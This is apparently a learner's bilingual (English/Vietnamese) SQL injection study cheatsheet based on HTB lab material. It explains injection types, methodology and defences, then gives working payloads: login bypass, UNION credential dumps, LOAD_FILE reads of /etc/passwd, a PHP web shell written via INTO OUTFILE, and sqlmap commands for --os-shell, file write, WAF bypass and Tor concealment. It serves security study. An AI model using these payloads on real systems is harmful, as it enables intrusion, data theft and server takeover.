# Table of contents
1. [SQL](#SQL)
2. [SQLi](#SQLi)
3. [Methodology](#Methodology)
4. [How to do](#How-to-do)
5. [Prevent](#Prevent)
6. [HTB cheatsheet](#HTB-cheatsheet)
7. [SQLmap](#SQLmap)
8. [Flags](#Flags)
9. [Self-exp as practicing](#Self-exp-as-practicing)

# SQL

## DBMS

| Category                          | Details                                                                                                    |
|-----------------------------------|------------------------------------------------------------------------------------------------------------|
| DBMS                              | - Database Management System<br>- Helps manage databases                                                   |
| Various Types of DBMS             | - File-based<br>- Relational DBMS<br>- NoSQL<br>- Graph-based<br>- Key/Value stores                        |
| Ways to Interact with DBMS        | - Command-line tools<br>- Graphical interface<br>- APIs (Application Programming Interfaces)               |
| Must-Have Features of a DBMS      | - **Concurrency**: Many users at the same time, ensuring data integrity<br> - **Consistency**: Maintains data consistency and validity during concurrent interactions<br> - **Security**: Prevents unauthorized viewing or editing of data<br> - **Reliability**: Supports easy backup to prevent data loss or breaches<br> - **SQL**: Simplifies user interaction |
| Two-Tiered Architecture           | User --> Web GUI (Tier 1) --> App Server (Tier 2) --> DBMS                                                |
| Main Types of Databases           | - Relational DB (uses SQL)<br>- Non-relational DB (uses various communication methods)                    |

<br>

| Relational Database                                   | Non-relational Database                                                 |
|-------------------------------------------------------|-------------------------------------------------------------------------|
| Uses tables with keys to link data                    | Does not use tables, rows, or columns like relational databases         |
| Uses schemas to define the data structure             | Stores data using different models based on the type of data            |
| Tables are associated with keys for quick data access | Lack of defined structure allows for scalability and flexibility        |
| Different tables are related to each other through keys | 4 common models: Key-Value, Document-Based, Wide-Column, and Graph     |
| Links tables using keys for data integration          | Suitable for datasets with undefined or unstructured data               |
| Tables can have multiple keys to link with other tables | Has a different method for injection called NoSQLi                     |
| Relationships between tables are defined by a schema  |                                                                         |

<br>

| Operator | Symbol |
|----------|--------|
| AND      | `&&`   |
| OR       | `\|\|`   |
| NOT      | `!`    |


# SQLi

![Screenshot 2024-11-07 122957](https://github.com/user-attachments/assets/b2fbce56-279d-4aa6-a559-642431fe43ab)

## In-Band
> Can see the messages or results

| Type | Description |
| --- | --- |
| **In-Band** (can see the messages or results) | - **Error Based Injection**: Force DB to generate Error Message --> To gain info likes: DB types and vers, SQL command being used, ... <br> - **Union Based Injection**: Leverage the UNION operator to combine the result of 2 queries into 1 (1 legit query from app + 1 query attack)
| **Blind (cant see the messages or results)** | - **Boolean Based**: True or False query, using 1=1 or 1!=1, SUBSTRING, ...<br> - **Time Based**: Pause the DB for a specific of time (to determine the query we make is correct or not) using Sleep() function
| **Out-Of-Band** | Using different channels to inject like: requests, DNS records |

<br>

# Methodology

## Black Box

| Step | Description |
| --- | --- |
|1. Map the app| - Visit all the urls as a user<br> - Walk through all the accessible pages as a user<br> - Make note of all Input vectors that potentially talk to the back-end<br> - Understand how application functions<br> - Figure out the logic of application<br> - Find subdomains, directories, pages that might not be directly visible |
|2. Fuzzing the app | - Fuzzing with SQL specific characters like: ' ; " ; # ; / ;...and look for anomalies<br> - Depend on how the app responds, start refining your query until achieve end goal (figure out the back-end query of the app)<br> - Submit Boolean conditions like: OR 1=1 and OR 1=2, and look for differences in app responses<br> - Submit payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond<br> - Submit OAST payload that are designed to trigger a network interaction with a server that you control. And if you get that network interaction (like a dns lookup, or through HTTP, ...) --> Vuln to out-of-band SQLi. |

## White Box

| Step | Description |
| --- | --- |
| 1. Enable web server logging | - Help when you fuzzing the app like with black-box, it will generates all different invalid characters you input into the app ==> Detect SQLi do exists and help to define your later payload |
| 2. Enable DB logging | - When you think that there's a SQLi vuln and you enter a SQLi payload in the parameter, you can see how it was logged at the back-end<br> - Depending on how you was logged at the back-end, you can see what characters made it through and in what format they made it through<br> - Base on that, you can conclude that SQLi exists or not |
|3. Map the app (like with black-box) | - Map all visible functionality of the app<br> - Map all input vectors that potentially talk to the back-end<br> - Regex search on all instances in the code that talk to the database |
| 4. Code review| Follow the code path for all input vectors |
| 5. Fuzz the app | - Submit sql characters that could potentially break query<br> - Look at how they were logged using DB logging<br> Make conclusion if app is vuln to SQLi or not. If it does, code review of that functionality<br>
| 6. Test any potential SQLi vuln | |

# How to do

## Error-based

- Submit SQL-specific characters like: `'` or `"` and look for errors or anomalies
- Different characters can give you different errors --> (Do Fuzz to check)

## Union-based

- Use UNION operator.
- Follow 2 basic rule of UNION:
    + Number and the other columns must be the same in all queries
    + The data type must be compatible
- Exploitation:
  + Figure out the number of columns that the query is making
  + Figure out the data types of the columns (mainly interested in string data)
  + Use UNION operator to output info from DB.
- Find the number of columns:
  + Using **ORDER BY**: `= ... order by 1`. Tăng số 1 lên đến khi gặp lỗi. Số trước khi gặp lỗi là số lượng columns có trong DB
  + Using **NULL Values**: `= ... UNION SELECT NULL--`. Tăng dần số lượng NULL đến khi dò ra được số columns: `'UNION SELECT NULL, NULL--`
- Find datatype (Vì ta chỉ quan trọng đến dạng string, nên ta sẽ test xem các columns có thể chứa giá trị là string hay không):
  + `' UNION SELECT 'a', NULL--`. Nếu fail, tiếp tục columns tiếp: `' UNION SELECT NULL, 'a'--`. Và so on...

## Boolean-Based Blind SQLi

- Submit a Boolean condition that evaluates to **False** and note the response
- Submit a Boolean condition that evaluates to **TRUE** and note the response
- If the response is different = SQLi boolean blind vuln
- Write a program/use tools that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response

## Time-Based Blind SQLi

- Submit a payload that pause the app for a specified period of time
- If the app does pause = Vuln
- Use tools/Write a program that uses conditional statements to ask the DB a series of TRUE/FALSE question and monitor response time

## Out-of-band SQLi

- Submit OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query and monitor for any resulting interactions
- Depending on SQLi use different methods to exfil data

# Prevent

- Primary Defenses:
  + Op1: Use of Prepared Statements (Parameterized Queries)
  + Op2: Use of Stored Procedures (Partial)
  + Op3: Whitelist Input Validation (Partial)
  + Op4: Escaping All User Supplied Input (Partial)

- Additional Defenses:
  + Op5: Enforcing Least Privilege
  + Op6: Performing Whitelist Input Validation as a Secondary Defense

# HTB cheatsheet

Auth Bypass: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

INFORMATION_SCHEMA Database contains metadata of DBs and Tables in the server.

| Technique                              | Description                                                                                                   |
|----------------------------------------|---------------------------------------------------------------------------------------------------------------|
| `' or 1=1-- -`                         | Basic SQL injection to bypass login or test vulnerability                                                     |
| `' order by 1-- -`                     | Detects the number of columns by incrementing the number in `ORDER BY` until an error occurs (total columns)  |
| `' UNION select 1,2,3-- -`             | Detects the number of columns using `UNION` injection by increasing the number of columns until no error      |
| `SELECT @@version`                     | Checks the database version                                                                                   |
| `SELECT SLEEP(5)`                      | Blind SQL injection to pause execution, used with other clauses to confirm queries                            |
| `SELECT POW(1,1)`                      | Alternative blind SQL injection method to verify responses                                                    |
| `SELECT * FROM my_database.users;`     | Selects data from another database or table                                                                   |
| `SELECT database()`                    | Retrieves the current database name                                                                           |

<br>

List of databases --> List of tables within each database --> List of columns within each table

List all databases:		`' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

List of tables within each database: `' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` (TABLE_NAME column stores table names, TABLE_SCHEMA column points to the database each table belongs to)

List of columns within each table: `' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

Dump data from a table in another database: `' UNION select 1, username, password, 4 from dev.credentials-- -`

## Reading files

The DB user must have the **FILE privilege** to load a file's content into a table and then dump data from that table and read files.

Current USER: 
- `SELECT USER()`
- `SELECT CURRENT_USER()`
- `SELECT user from mysql.user`

Check USER Privileges:
- `SELECT super_priv FROM mysql.user`
- `UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
- `UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
- `UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

## LOAD_FILE

Now that we know we have enough **privileges to read local system files**, let us do that using the **LOAD_FILE() function**.

`SELECT LOAD_FILE('/etc/passwd');`

`UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

`UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -` : the page ends up rendering the HTML code within the browser. The source code shows us the entire PHP code, which could be inspected further to find sensitive information like database connection credentials or find more vulnerabilities.

## Writing files

To be able to **write files** to the back-end server using a MySQL database, we **require** three things:
- User with **FILE privilege** enabled
- MySQL global **secure_file_priv** variable **not enabled**
- **Write access** to the location we want to write to on the back-end server

The **secure_file_priv** variable is used to determine **where to read/write files from**. An **empty value** lets us **read** files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, **NULL** means we **cannot read/write** from any directory. `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

## SELECT INTO OUTFILE

The **SELECT INTO OUTFILE** statement can be used to **write data*** from select queries into files.
- `SELECT * from users INTO OUTFILE '/tmp/credentials';`
- `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`

## Writing Files through SQL Injection

To write a web shell, we must know the **base web directory** for the web server (i.e. **web root**). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots.
- `select 'file written successfully!' into outfile '/var/www/html/proof.txt'`
- `union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

## Writing a Web Shell

`<?php system($_REQUEST[0]); ?>`
`union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Once again, we don't see any errors, which means the file write probably worked. This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL: `http://SERVER_IP:PORT/shell.php?0=id`


# SQLmap

see the types of SQL injections supported by SQLMap:	`sqlmap -hh` (advanced listing); `sqlmap -h` (basic listing)

The technique characters **BEUSTQ** refers to the following:
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries

## Log Messages Description

Below are some of the most common messages usually found during a scan of SQLMap:
- `URL content is stable/"target URL content is stable"`: không có thay đổi lớn nào giữa các phản hồi trong trường hợp các yêu cầu giống hệt nhau liên tục
- `Parameter appears to be dynamic/"GET parameter 'id' appears to be dynamic"`: Ta mong muốn tham số được thử nghiệm là "động", vì đó là dấu hiệu cho thấy bất kỳ thay đổi nào được thực hiện đối với giá trị của nó sẽ dẫn đến thay đổi trong phản hồi, do đó, tham số có thể được liên kết với DB
- `Parameter might be injectable/ "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS:'MySQL')"`: lỗi DBMS là một dấu hiệu tốt về SQLi tiềm ẩn.
- `Parameter might be vulnerable to XSS attacks/"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"`: helpfull if no SQLi found
- `Back-end DBMS is '...'/"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"`: Trong trường hợp có dấu hiệu rõ ràng cho thấy mục tiêu đang sử dụng DBMS cụ thể, chúng ta có thể thu hẹp payload xuống chỉ còn DBMS cụ thể đó.
- `Level/risk values/"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"`: chạy tất cả các payload SQLi cho DBMS cụ thể đó, trong khi nếu không phát hiện thấy DBMS nào, thì chỉ các payload hàng đầu mới được kiểm tra
- `Reflective values found/"reflective value(s) found and filtering out"`: Chỉ là cảnh báo rằng các phần của payload đã sử dụng được tìm thấy trong phản hồi. SQLMap có cơ chế lọc để loại bỏ rác như vậy trước khi so sánh nội dung trang gốc.
- `Parameter appears to be injectable/"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"`:
  + Thông báo này cho biết tham số có vẻ như có thể tiêm được, mặc dù vẫn có khả năng là kết quả false positive.
  + Trong trường hợp boolean-based blind and similar SQLi types (e.g., time-based blind), khả năng cao là false-positives.
  + Khi kết thúc quá trình chạy, SQLMap sẽ thực hiện thử nghiệm mở rộng bao gồm các kiểm tra logic đơn giản để loại bỏ các kết quả false-positives.
  + Ngoài ra, với --string="luther" cho biết SQLMap đã nhận dạng và sử dụng sự xuất hiện của giá trị chuỗi hằng số luther trong phản hồi để phân biệt các phản hồi ĐÚNG với SAI. Đây là một phát hiện quan trọng vì trong những trường hợp như vậy, không thể coi là kết quả false-positives.

- `Time-based comparison statistical model/"time-based comparison requires a larger statistical model, please wait........... (done)"`:
  + SQLMap sử dụng mô hình thống kê để nhận dạng các phản hồi mục tiêu thường xuyên và (cố ý) bị trì hoãn.
  + Để mô hình này hoạt động, cần phải thu thập đủ số lần phản hồi thường xuyên. Theo cách này, SQLMap có thể phân biệt thống kê giữa độ trễ cố ý ngay cả trong môi trường mạng có độ trễ cao.

- `Extending UNION query injection technique tests/"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"`:
  + UNION-query SQLi yêu cầu nhiều REQUEST hơn đáng kể để nhận dạng thành công tải trọng có thể sử dụng so với các loại SQLi khác.
  + Để giảm thời gian kiểm tra cho mỗi tham số, đặc biệt là nếu mục tiêu dường như không thể tiêm được, số lượng yêu cầu được giới hạn ở một giá trị hằng số (tức là 10) cho loại kiểm tra này.
  + Tuy nhiên, nếu có khả năng cao là mục tiêu dễ bị tấn công, đặc biệt là khi tìm thấy một kỹ thuật SQLi (có khả năng) khác, SQLMap sẽ mở rộng số lượng yêu cầu mặc định cho truy vấn UNION SQLi, vì kỳ vọng thành công cao hơn.

- `Technique appears to be usable/"ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"`:
  + Là một kiểm tra theo phương pháp heuristic cho loại UNION-query SQLi, trước khi các payload UNION thực tế được gửi đi, một kỹ thuật được gọi là ORDER BY được kiểm tra về khả năng sử dụng.
  + Trong trường hợp có thể sử dụng được, SQLMap có thể nhanh chóng nhận ra số lượng chính xác các cột UNION cần thiết bằng cách thực hiện phương pháp tìm kiếm nhị phân.

- `Parameter is vulnerable/"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"`:
  + Đây là một trong những thông báo quan trọng nhất của SQLMap, vì nó có nghĩa là tham số được phát hiện là dễ bị tấn công SQL injection.
  + Trong các trường hợp thông thường, người dùng có thể chỉ muốn tìm ít nhất một điểm tiêm (tức là tham số) có thể sử dụng được đối với mục tiêu.
  + Tuy nhiên, nếu chúng ta đang chạy thử nghiệm mở rộng trên ứng dụng web và muốn báo cáo tất cả các lỗ hổng tiềm ẩn, chúng ta có thể tiếp tục tìm kiếm tất cả các tham số dễ bị tấn công.

- `Sqlmap identified injection points/"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"`:
  + Tiếp theo là danh sách tất cả các injection points with type, title, and payloads, đại diện cho  final proof về việc phát hiện và khai thác thành công các lỗ hổng SQLi đã tìm thấy.

- `Data logged to text files/"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"`:
  + Điều này cho biết vị trí hệ thống tệp cục bộ được sử dụng để lưu trữ tất cả các bản ghi, phiên và dữ liệu đầu ra cho một mục tiêu cụ thể - trong trường hợp này là www.example.com.
  + Sau lần chạy ban đầu như vậy, khi điểm tiêm được phát hiện thành công, tất cả các chi tiết cho các lần chạy trong tương lai được lưu trữ bên trong các tệp phiên của cùng một thư mục.
  + Điều này có nghĩa là SQLMap cố gắng giảm các yêu cầu mục tiêu bắt buộc càng nhiều càng tốt, tùy thuộc vào dữ liệu của các tệp phiên.

## Running SQLMap on an HTTP Request

- `Curl Commands`: 1 cách dễ để và chuẩn chỉ để triển khai SQL map là tận dụng Copy as cURL trong phần Network của browser và sau đó sửa phần cURL = sqlmap.
- Lưu ý: khi dùng SQL map, data hay link truyền vào phải có giá trị tham số để test. Nếu không thì cần phải dùng flags hoặc opts bổ sung.
- `GET request`: tham số url truyền vào cần đi kèm với flag: -u/--url
- `POST request`: sử dụng flag: --data:
  + `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
  + Trong trường hợp ta chắc chắn rằng tham số "**udi**" dễ bị SQLi, ta có thể thu hẹp phạm vi chỉ test tham số uid đó thôi với flag: -p uid. Nếu không, ta có thể đánh dấu nó bên trong dữ liệu được cung cấp bằng cách sử dụng dấu hiệu đặc biệt * như sau: `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`

- Full HTTP Requests: Trong trường hợp HTTP REQUEST phức tạp với nhiều header value khác nhau và POST BODY kéo dài, ta có thể dùng flag: -r . Như thế, ta sẽ cung cấp cho SQL map 1 file chứa HTTP request. Ta có thể copy request từ Burp để tạo file.
- Custom SQLMap Requests: Ta có thể tự tạo Request. VD:
  + `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
  + `sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
  + `--random-agent` flag này chọn giá trị của header User-agent là random từ database được cung cấp  nhằm bypass 1 số biện pháp bảo vệ chặn user-agent của SQL map (User-agent: sqlmap/1.4.9.12#dev)
  + `--mobile`	: giúp giả dạng smartphone
  + SQLmap mặc định chỉ nhắm vào các tham số HTTP. Tuy nhiên, ta vẫn có thể kiểm tra các Header (e.g. --cookie="id=1*")
  + Đổi method với flag: `--method`: `sqlmap -u www.target.com --data='id=1' --method PUT`

- `Custom HTTP Requests`: Bên cạnh các form-data thường thấy như POST, SQL map cũng support JSON format (e.g. {"id":1}) và XML format  (e.g. <element><id>1</id></element>) trong HTTP request

## Handling SQLMap Errors

Recommended mechanisms for finding the cause and properly fixing it:
- `Display Errors`: Bước đầu trong việc phân tích lỗi của SQLmap là dùng flag --parse-errors để phân tích lỗi DBMS (nếu có) và hiển thị chúng như một phần của chương trình chạy.

- `Store the Traffic`:
  + `-t` option stores the whole traffic content to an output file: `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt`
  + tệp `/tmp/traffic.txt` hiện chứa tất cả các yêu cầu HTTP đã gửi và đã nhận. Vì vậy, bây giờ chúng ta có thể điều tra thủ công các yêu cầu này để xem sự cố đang xảy ra ở đâu.

- `Verbose Output`: flag `-v` để quá trình chạy có verbose. `-v 6`	: trực tiếp in tất cả lỗi và yêu cầu HTTP đầy đủ đến thiết bị đầu cuối để chúng ta có thể theo dõi mọi thứ SQLMap đang thực hiện theo thời gian thực.

- `Using Proxy`: ta có thể sử dụng `--proxy` (e.g., Burp) để traffic sẽ đi qua và được hiện thị trong proxy đó

## Attack Tuning

- Trong hầu hết các trường hợp, SQLMap sẽ chạy ngay khi có thông tin chi tiết về mục tiêu được cung cấp. Tuy nhiên, có các tùy chọn để tinh chỉnh các nỗ lực tiêm SQLi để giúp SQLMap trong giai đoạn phát hiện.
- Mỗi payload được gửi đến mục tiêu bao gồm:
  + vector (e.g., UNION ALL SELECT 1,2,VERSION()): phần trung tâm của payload, mang theo mã SQL hữu ích để thực thi tại mục tiêu.
  + boundaries (e.g. '<vector>-- -): prefix and suffix được sử dụng để đưa vector vào câu lệnh SQL dễ bị tấn công một cách chính xác.

- `Prefix/Suffix`: requirement của chúng khá hiếm, chỉ trong 1 số trường hợp. `--prefix` and `--suffix` có thể được dùng như sau:
  + `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`
  + Điều này sẽ tạo ra một vùng bao quanh tất cả các giá trị vectơ giữa tiền tố tĩnh `%'))` và hậu tố `-- -`.

- `Level/Risk`: 2 options này có thể được dùng để bổ sung cho 2 (vector và boudaries) đã nói ở trên.
  + `--level` (1-5, default 1): mở rộng cả vector và boudaries đang được sử dụng, dựa trên kỳ vọng thành công của chúng (tức là kỳ vọng càng thấp thì cấp độ càng cao).
  + `--risk` (1-3, default 1): mở rộng tập vector đã được sử dụng dựa trên rủi ro gây ra sự cố ở phía mục tiêu (i.e, database entry loss or denial-of-service)

- Cách tốt nhất để kiểm tra sự khác biệt giữa `boundaries` and `payloads` cho các giá trị khác nhau của `--level` và `--risk` là sử dụng tùy chọn `-v` để đặt mức độ chi tiết. **`(dùng -v 3)`**
  + `sqlmap -u www.example.com/?id=1 -v 3 --level=5`
  + `sqlmap -u www.example.com/?id=1 -v 3`
  + ` sqlmap -u www.example.com/?id=1 --level=5 --risk=3`
  + 3 command này sẽ display mức độ chi tiết khác nhau

- Đối với số lượng payloads, theo **mặc định** (tức là --level=1 --risk=1), số lượng payload được sử dụng để kiểm tra một tham số duy nhất tăng lên đến 72, trong khi trong trường hợp chi tiết nhất (--level=5 --risk=3), số lượng payload tăng lên đến 7.865.
- Vì SQLMap đã được điều chỉnh để kiểm tra các ranh giới và vectơ phổ biến nhất, nên người dùng thông thường được khuyên không nên chạm vào các tùy chọn này vì nó sẽ làm cho toàn bộ quá trình phát hiện chậm hơn đáng kể.
- Tuy nhiên, trong các trường hợp đặc biệt của lỗ hổng SQLi, khi việc sử dụng tải trọng OR là bắt buộc (ví dụ: trong trường hợp trang đăng nhập), chúng tôi có thể phải tự mình nâng mức rủi ro. Điều này là do tải trọng OR vốn nguy hiểm trong một lần chạy mặc định.

## Advanced Tuning

- `Status Codes`: when dealing with a huge target response with a lot of dynamic content,  subtle differences là TRUE và FALSE responses. Nếu sự khác nhau này có thể nhìn thấy qua HTTP codes (200 or 301,...) dùng flag --code (+ number) để chỉ phát hiện response có code đó.
- `Titles`: chỉ định phát hiện qua HTML tag <title> của page với flag `--titles`
- `Strings`: phát hiện dựa trên string. flag `--string`
- `Text-only`: Khi xử lý nhiều nội dung ẩn, chẳng hạn như một số behavior tags của trang HTML (ví dụ: <script>, <style>, <meta>, v.v.), chúng ta có thể sử dụng lệnh `--text-only` để xóa tất cả các thẻ HTML và chỉ dựa trên nội dung văn bản (tức là nội dung hiển thị) để so sánh.
- Techniques:
  + Trong một số trường hợp đặc biệt, chúng ta phải thu hẹp các payload đã sử dụng chỉ còn một loại nhất định. Ví dụ, nếu time-based blind payloads gây ra sự cố dưới dạng response timeouts, hoặc nếu chúng ta muốn buộc sử dụng một loại payload SQLi cụ thể, tùy chọn `--technique` có thể chỉ định kỹ thuật SQLi sẽ được sử dụng.
  + Ví dụ, nếu chúng ta muốn **bỏ qua** time-based blind and stacking SQLi payloads và chỉ kiểm tra `boolean-based blind, error-based, and UNION-query payloads`, chúng ta có thể chỉ định các kỹ thuật này bằng `--technique=BEU`.

- `UNION SQLi Tuning`:
  + Trong một số trường hợp, các payload UNION SQLi yêu cầu thông tin bổ sung do người dùng cung cấp để hoạt động. Nếu chúng ta có thể tìm thủ công số lượng chính xác các cột của truy vấn SQL dễ bị tấn công, chúng ta có thể cung cấp số này cho SQLMap với tùy chọn `--union-cols` (ví dụ: --union-cols=17).
  + Trong trường hợp các giá trị điền **"giả"** `mặc định được SQLMap sử dụng -NULL` và số nguyên ngẫu nhiên- không tương thích với các giá trị từ kết quả của truy vấn SQL dễ bị tấn công, chúng ta có thể chỉ định một giá trị thay thế (ví dụ: `--union-char='a'`).
  + Ngoài ra, trong trường hợp có yêu cầu sử dụng phần phụ lục **(appendix)** ở cuối truy vấn UNION dưới dạng FROM <table> (ví dụ: trong trường hợp của Oracle), chúng ta có thể đặt nó bằng tùy chọn `--union-from` (ví dụ: --union-from=users). Việc không sử dụng phần phụ lục FROM thích hợp một cách tự động có thể là do không phát hiện được tên DBMS trước khi sử dụng.

## Bypassing Web Application Protections

- `Anti-CSRF Token Bypass`: `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"`
- `Unique Value Bypass`: `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI`
- `Calculated Parameter Bypass` (giá trị tham chiếu được tính toán / mã hóa): `sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`
- `IP Address Concealing` (bị block IP):
  + use a proxy or the anonymity network Tor
  + A proxy can be set with the option `--proxy` (e.g. --proxy="socks4://177.39.187.70:33283")
  + if we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`

The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).

- `WAF Bypass`:
  + Khi chúng ta chạy SQLMap, trong các bài kiểm tra ban đầu, SQLMap gửi một payload trông có vẻ độc hại với một tên tham số không tồn tại (ví dụ: ?pfov=...) để kiểm tra sự tồn tại của WAF (Tường lửa Ứng dụng Web). Nếu có bất kỳ cơ chế bảo vệ nào giữa người dùng và mục tiêu, phản hồi sẽ thay đổi đáng kể so với ban đầu. Ví dụ, nếu WAF phổ biến như ModSecurity được triển khai, sẽ có phản hồi 406 - Not Acceptable sau yêu cầu này.
  + Nếu phát hiện WAF, để xác định cơ chế bảo vệ cụ thể, SQLMap sử dụng thư viện bên thứ ba identYwaf, chứa các chữ ký của 80 giải pháp WAF khác nhau. Nếu muốn bỏ qua bài kiểm tra này (để giảm tiếng ồn), chúng ta có thể sử dụng tùy chọn `--skip-waf`.

- `User-agent Blacklisting Bypass`: In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap. Consider using: `--random-agent`

- `Tamper Scripts`:
  + Một trong những cơ chế phổ biến nhất được SQLMap triển khai để vượt qua các giải pháp WAF/IPS là các "tamper" scripts. Đây là các đoạn script đặc biệt (Python) được viết để chỉnh sửa yêu cầu ngay trước khi gửi đến mục tiêu, chủ yếu nhằm qua mặt các cơ chế bảo vệ.
  + Ví dụ, một tamper script phổ biến thay thế tất cả các trường hợp của toán tử lớn hơn (>) bằng NOT BETWEEN 0 AND #, và toán tử bằng (=) bằng BETWEEN # AND #. Bằng cách này, nhiều cơ chế bảo vệ cơ bản
  + Các tamper scripts có thể được xâu chuỗi liên tiếp nhau trong tùy chọn `--tamper` (ví dụ: --tamper=between,randomcase), và chúng sẽ được chạy theo thứ tự ưu tiên được định trước

- `Miscellaneous Bypasses`:
  + Ngoài các cơ chế vượt qua bảo vệ khác, có hai cơ chế đáng chú ý. Đầu tiên là `Chunked transfer encoding`, được bật bằng cách sử dụng tùy chọn `--chunked`, chia nhỏ nội dung của yêu cầu POST thành các "chunk". Các từ khóa SQL bị cấm được chia giữa các "chunk" sao cho yêu cầu chứa chúng có thể vượt qua mà không bị phát hiện.
  + Cơ chế thứ hai là `HTTP parameter pollution (HPP)`, trong đó các payload được chia tương tự như --chunked, nhưng giữa các giá trị có cùng tên tham số (ví dụ: ?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users...). Các giá trị này sẽ được nền tảng mục tiêu (ví dụ: ASP) nối lại nếu nền tảng đó hỗ trợ.

## OS Exploitation

- `READ FILE`:
  + Sau khi đã kiểm tra ta có quyền `DBA: True` với `--is-dba`, ta có thể đọc local files với `--file-read`:
  + `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
  + Khi đó, SQLmap sẽ lưu file vào local của ta.

- `WRITE FILE`:
  + Để write file, cần phải đảm bảo rằng `--secure-file-priv` được **disabled**. Chuẩn bị file shell để viết lên và biết được vị trí ta cần tải lên:
  + `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`. Sau đó thì dùng shell với curl hoặc web

- `OS command execution`:
  + Nếu ta có thể viết file để command execution, khả năng cao ta cũng có thể test tính năng của SQL map tạo easy shell cho chúng ta mà không phải viết shell bằng tay. Do SQLmap thực hiện khai thác lỗi để lấy shell. `sqlmap -u "http://www.example.com/?id=1" --os-shell`
  + Tuy nhiên, có thể gặp lỗi nên có thể đổi phương thức, ví dụ như Error-based SQL Injection: `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`

# Flags

- `--batch`: skipping any required user-input, automatically choosing using the default option.
- `--data`: data truyền vào. POST REQUEST
- `-r`: để đi kèm file
- `--random-agent`: chọn ngẫu nhiên hearder user-agent từ DB được cung cấp
- `--mobile`: giả dạng smartphone
- `--cookie="id=1*"`: test SQLi ở Header
- `--method`: đổi method

<br>

- `--parse-errors`: hiện error nếu có trong quá trình chạy
- `-t`: + txt file để lưu traffic ra output file
- `-v 6`: chỉ định verbosity level
- `--proxy`: dùng proxy làm trung gian

<br>

- `--prefix`: chỉ định tiền tố
- `--suffix`: chỉ định hậu tố
- `--level (1-5, default 1)`: the lower the expectancy, the higher the level
- `--risk (1-3, default 1)`
- `--code`: chỉ định phát hiện status code của response
- `--titles`: chỉ định phát hiện qua tittle của page
- `--string`: phát hiện dựa trên string được chỉ định
- `--text-only`: removes all the HTML tags
- `--technique`: chỉ định kỹ thuật nhất định được dùng
- `--union-cols`: chỉ định số cột để UNION
